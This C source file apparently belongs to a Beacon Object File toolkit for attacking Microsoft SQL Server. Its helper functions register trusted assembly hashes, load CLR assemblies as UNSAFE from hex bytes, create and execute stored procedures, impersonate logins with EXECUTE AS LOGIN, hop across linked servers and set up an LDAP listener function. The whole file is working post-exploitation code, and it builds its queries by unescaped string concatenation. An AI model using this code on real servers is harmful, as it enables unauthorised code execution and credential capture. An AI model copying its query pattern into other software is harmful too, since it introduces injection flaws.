//
// imported by bof entry files utilizing CLR functionality
// include statmenet should be after the sql.c include
//
#include <windows.h>
#include <sql.h>
#include "bofdefs.h"

BOOL AssemblyHashExists(SQLHSTMT stmt, char* hash, char* link, char* impersonate)
{
    BOOL exists = FALSE;
    
    char* prefix = "SELECT * FROM sys.trusted_assemblies WHERE hash = 0x";
    char* suffix = ";";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(hash) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, hash, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix, totalSize - MSVCRT$strlen(query) - 1);

    if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE))
    {
        internal_printf("[-] Error determining if assmebly hash exists\n");
        intFree(query);
        return TRUE;
    }
    
    char* resultHash = GetSingleResult(stmt, FALSE);
    
    //
    // if we have any result, the hash exists
    //
    if (resultHash != NULL)
    {
        exists = TRUE;
    }
    else
    {
        internal_printf("[*] Assembly hash does not exist (error fetching result normal)\n");
    }
    
    intFree(query);
    intFree(resultHash);
    return exists;
}

BOOL AddTrustedAssembly(SQLHSTMT stmt, char* dllPath, char* hash, char* link, char* impersonate)
{
    char* prefix    = "EXEC sp_add_trusted_assembly 0x";
    char* mid       = ",N'";
    char* suffix    = ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(hash) + MSVCRT$strlen(mid) + MSVCRT$strlen(dllPath) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, hash,     totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, mid,      totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, dllPath,  totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

BOOL DeleteTrustedAssemblyResources(SQLHSTMT stmt, char* assemblyName, char* function, BOOL isFunction, char* link, char* impersonate)
{
    char* drop_proc;
    char* prefix;
    char* query;
    char* suffix = ";";

    //
    // DROP FUNCTION
    //
    if (isFunction)
    {
        prefix = "DROP FUNCTION IF EXISTS ";
    }
    else
    {
        prefix = "DROP PROCEDURE IF EXISTS ";
    }


    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(function) + MSVCRT$strlen(suffix) + 1;
    query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, function, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);


    if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE))
    {
        internal_printf("[-] Error dropping function\n");
        intFree(query);
        return FALSE;
    }

    intFree(query);

    //
    // DROP ASSEMBLY
    //
    char* asmPrefix = "DROP ASSEMBLY IF EXISTS ";
    totalSize = MSVCRT$strlen(asmPrefix) + MSVCRT$strlen(assemblyName) + MSVCRT$strlen(suffix) + 1;
    query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, asmPrefix);
    MSVCRT$strncat(query, assemblyName, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,       totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

BOOL DeleteTrustedAssembly(SQLHSTMT stmt, char* hash, char* link, char* impersonate)
{
    char* prefix = "EXEC sp_drop_trusted_assembly 0x";
    char* suffix = ";";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(hash) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, hash,     totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

BOOL AssemblyExists(SQLHSTMT stmt, char* assemblyName, char* link, char* impersonate)
{
    BOOL exists;
    char* prefix = "SELECT * FROM sys.assemblies WHERE name = '";
    char* suffix = "';";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(assemblyName) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, assemblyName, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,       totalSize - MSVCRT$strlen(query) - 1);

    if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE))
    {
        internal_printf("[-] Error determining if assmebly exists\n");
        intFree(query);
        return TRUE;
    }
    
    char* resultHash = GetSingleResult(stmt, FALSE);
    
    if (MSVCRT$strcmp(resultHash, assemblyName) == 0)
    {
        exists = TRUE;
    }
    else
    {
        exists = FALSE;
    }

    ODBC32$SQLCloseCursor(stmt);
    intFree(query);
    intFree(resultHash);
    return exists;
}

BOOL CreateAssembly(SQLHSTMT stmt, char* assemblyName, char* dllBytes, char* link, char* impersonate)
{
    char* prefix = "CREATE ASSEMBLY ";
    char* mid = " FROM 0x";
    char* suffix = " WITH PERMISSION_SET = UNSAFE;";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(assemblyName) + MSVCRT$strlen(mid) + MSVCRT$strlen(dllBytes) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, assemblyName, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, mid,          totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, dllBytes,     totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,       totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}

BOOL AssemblyStoredProcExists(SQLHSTMT stmt, char* function, char* link, char* impersonate)
{
    char* prefix = "SELECT name FROM sys.procedures WHERE type = 'PC' AND name = '";
    char* suffix = "';";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(function) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, function, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE))
    {
        internal_printf("[-] Error determining if stored procedure exists\n");
        intFree(query);
        return TRUE;
    }

    char* result = GetSingleResult(stmt, FALSE);
    BOOL exists = (MSVCRT$strcmp(result, function) == 0) ? TRUE : FALSE;
    
    ODBC32$SQLCloseCursor(stmt);
    intFree(query);
    intFree(result);
    
    return exists;
}

BOOL AssemblyFunctionExists(SQLHSTMT stmt, char* function, char* link, char* impersonate)
{
    char* prefix = "SELECT assembly_class FROM sys.assembly_modules WHERE assembly_class = '";
    char* suffix = "';";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(function) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, function, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, FALSE))
    {
        internal_printf("[-] Error determining if function exists\n");
        intFree(query);
        return TRUE;
    }

    char* result = GetSingleResult(stmt, FALSE);
    BOOL exists = (MSVCRT$strcmp(result, function) == 0) ? TRUE : FALSE;

    intFree(query);
    intFree(result);

    return exists;
}

BOOL CreateAssemblyStoredProc(SQLHSTMT stmt, char* assemblyName, char* function, BOOL Adsi, char* link, char* impersonate)
{
    char* query = NULL;

    if (Adsi)
    {
        //
        // for ADSI BOF
        //
        char* prefix    = "CREATE FUNCTION [dbo].";
        char* part2     = "(@port int) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME ";
        char* suffix    = ".[ldapAssembly.LdapSrv].listen;";

        size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(function) + MSVCRT$strlen(part2) + MSVCRT$strlen(assemblyName) + MSVCRT$strlen(suffix) + 1;
        query = (char*)intAlloc(totalSize * sizeof(char));

        MSVCRT$strcpy(query, prefix);
        MSVCRT$strncat(query, function,     totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, part2,        totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, assemblyName, totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, suffix,       totalSize - MSVCRT$strlen(query) - 1);
    }
    else
    {
        //
        // for CLR BOF
        //
        char* prefix    = "CREATE PROCEDURE [dbo].[";
        char* part2     = "] AS EXTERNAL NAME [";
        char* part3     = "].[StoredProcedures].[";
        char* suffix    = "];";

        size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(function) + MSVCRT$strlen(part2) + MSVCRT$strlen(assemblyName) + MSVCRT$strlen(part3) + MSVCRT$strlen(function) + MSVCRT$strlen(suffix) + 1;
        query = (char*)intAlloc(totalSize * sizeof(char));

        MSVCRT$strcpy(query, prefix);
        MSVCRT$strncat(query, function,     totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, part2,        totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, assemblyName, totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, part3,        totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, function,     totalSize - MSVCRT$strlen(query) - 1);
        MSVCRT$strncat(query, suffix,       totalSize - MSVCRT$strlen(query) - 1);
    }

    //
    // special case for impersonation here
    // CREATE PROCEDURE statements are not allowed in a batch with other statements
    //
    BOOL result;
    if (impersonate != NULL)
    {
        char* iPrefix = "EXECUTE AS LOGIN = '";
        char* iSuffix = "';";

        size_t totalSize = MSVCRT$strlen(iPrefix) + MSVCRT$strlen(impersonate) + MSVCRT$strlen(iSuffix) + 1;
        char* impersonateQuery = (char*)intAlloc(totalSize * sizeof(char));

        MSVCRT$strcpy(impersonateQuery, iPrefix);
        MSVCRT$strncat(impersonateQuery, impersonate, totalSize - MSVCRT$strlen(impersonateQuery) - 1);
        MSVCRT$strncat(impersonateQuery, iSuffix, totalSize - MSVCRT$strlen(impersonateQuery) - 1);

        if (!ExecuteQuery(stmt, (SQLCHAR*)impersonateQuery))
        {
            internal_printf("[-] Error impersonating user\n");
            intFree(impersonateQuery);
            return FALSE;
        }
        
        intFree(impersonateQuery);
        result = ExecuteQuery(stmt, (SQLCHAR*)query);
    }
    else
    {
        result = HandleQuery(stmt, (SQLCHAR*)query, link, NULL, TRUE);
    }
    intFree(query);
    return result;
}

BOOL ExecuteAssemblyStoredProc(SQLHSTMT stmt, char* function, char* link, char* impersonate)
{
    char* prefix = "EXEC ";
    char* suffix = ";";

    size_t totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(function) + MSVCRT$strlen(suffix) + 1;
    char* query = (char*)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, function, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix,   totalSize - MSVCRT$strlen(query) - 1);

    BOOL result = HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE);
    intFree(query);
    return result;
}